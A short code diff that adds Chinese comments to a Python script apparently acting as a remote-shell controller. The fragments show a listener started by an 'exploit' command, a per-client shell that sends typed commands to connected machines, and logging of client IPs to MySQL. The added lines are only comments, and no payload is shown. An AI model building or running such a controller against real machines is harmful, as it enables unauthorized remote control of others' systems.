@@ -77,6 +77,7 @@ def get_mysql():
     return results
 
 
+# 连接客户端
 def connect():
     mysql_ip_list = []
     s = socket(AF_INET, SOCK_STREAM)
@@ -107,6 +108,7 @@ def connect():
                 insert_mysql()
 
 
+# 客户端shell操作
 def client_shell(client, addr):
     while True:
         user_cmd = input(f'[{addr}]>>')
@@ -134,6 +136,7 @@ def client_shell(client, addr):
             print(data)
 
 
+# 服务端shell命令控制
 def server_shell(a_cmd):
     global ip
     global port
@@ -154,6 +157,7 @@ def server_shell(a_cmd):
     else:
         while True:
             cmd = input('blaze(lif314)>')
+            # 检测连接的客户端
             if cmd == "exploit":
                 t = Thread(target=connect)
                 t.setDaemon(True)
